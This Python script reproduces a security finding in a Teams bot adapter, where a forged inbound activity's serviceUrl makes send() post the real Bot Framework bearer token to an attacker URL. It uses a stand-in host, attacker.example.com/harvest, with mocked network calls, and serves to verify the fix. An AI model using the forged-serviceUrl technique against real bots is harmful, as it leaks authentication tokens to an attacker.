"""Reproduction: the Teams adapter's send() trusts the inbound
Activity's serviceUrl unconditionally, and later POSTs a real Bot
Framework bearer token to whatever URL an attacker put there. One
forged inbound message is enough to redirect every future authenticated
reply to that user to an attacker-controlled endpoint.

Run from repo root:
    uv run python findings/teams-serviceurl-ssrf-token-leak/repro.py

BEFORE the fix: on_message() accepts the forged activity, caches the
attacker's URL, and send() later POSTs the real bearer token there.
AFTER the fix: on_message() rejects the forged activity outright
(returns None) because serviceUrl doesn't match a trusted Microsoft
Bot Framework domain -- nothing is cached, send() never runs.
"""

import asyncio
import sys
from pathlib import Path
from unittest.mock import AsyncMock, patch

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from glc.channels.catalogue.teams.adapter import Adapter
from glc.channels.envelope import ChannelReply

ATTACKER_URL = "https://attacker.example.com/harvest"
FAKE_REAL_TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGc...THIS-WOULD-BE-A-REAL-BOT-FRAMEWORK-TOKEN"


async def main() -> int:
    adapter = Adapter(config={})  # no mock -- exercises the real send() path

    # Step 1: attacker sends ONE inbound message with a forged serviceUrl.
    # (Real Bot Framework activities always carry a serviceUrl field;
    # a valid inbound JWT proves who sent the activity, not that this
    # particular field is trustworthy.)
    forged_activity = {
        "type": "message",
        "id": "a1",
        "from": {"id": "attacker-id", "name": "attacker"},
        "text": "hi",
        "serviceUrl": ATTACKER_URL,
        "conversation": {"id": "c1"},
        "timestamp": "2026-01-01T00:00:00Z",
    }
    msg = await adapter.on_message(forged_activity)

    if msg is None:
        print("on_message() rejected the forged activity (serviceUrl not trusted).")
        print("No context was cached; send() has nothing to leak a token to.")
        print("\nFIXED: the forged serviceUrl never reaches an outbound request.")
        return 0

    print(f"on_message() accepted, cached serviceUrl = {adapter._conv_cache[msg.channel_user_id]['service_url']!r}")

    # Step 2: the gateway later replies to this user (completely normal,
    # legitimate behavior -- any real conversation triggers this).
    captured: dict = {}

    async def fake_post(self, url, json=None, headers=None, **kw):
        captured["url"] = url
        captured["headers"] = headers

        class FakeResp:
            status_code = 200

            def raise_for_status(self):
                pass

            def json(self):
                return {"id": "resp1"}

        return FakeResp()

    with patch("glc.channels.catalogue.teams.adapter._fetch_token", new=AsyncMock(return_value=FAKE_REAL_TOKEN)):
        with patch("httpx.AsyncClient.post", new=fake_post):
            reply = ChannelReply(channel="teams", channel_user_id="attacker-id", text="here's your answer", thread_id="a1")
            await adapter.send(reply)

    print(f"\nOutbound POST went to: {captured['url']}")
    print(f"Authorization header sent: {captured['headers'].get('Authorization')}")

    if captured["url"].startswith(ATTACKER_URL):
        print("\n*** VULNERABLE: the real Bot Framework bearer token was POSTed to the attacker's own URL. ***")
        return 1
    print("\nOK: outbound request stayed on a legitimate Microsoft endpoint.")
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
